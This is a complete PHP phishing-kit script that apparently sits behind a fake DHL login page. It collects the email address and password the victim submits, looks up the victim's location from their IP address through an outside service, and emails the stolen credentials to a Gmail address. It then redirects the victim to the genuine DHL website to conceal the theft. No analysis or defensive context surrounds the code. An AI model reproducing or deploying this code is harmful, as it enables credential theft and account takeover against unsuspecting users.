<? 
$ip = getenv("REMOTE_ADDR");
$url = "http://api.ipinfodb.com/v3/ip-city/?key=5cfaab6c5af420b7b0f88d289571b990763e37b66761b2f053246f9db07ca913&ip=$ip";
$ipCountryCity = file_get_contents($url);
$message = "=====[$ip]=====\n";
$message .= "Email ID: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "Country:" .$ipCountryCity."\n";
$message .= "=====+[Created By SMG]+====\n";
$send= "gang19goalz@gmail.com"; 
$subject = "DH[$ipCountryCity]";
$headers = "From: SMG<master@logs.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
header("Location:http://www.dhl.com/en.html");
?>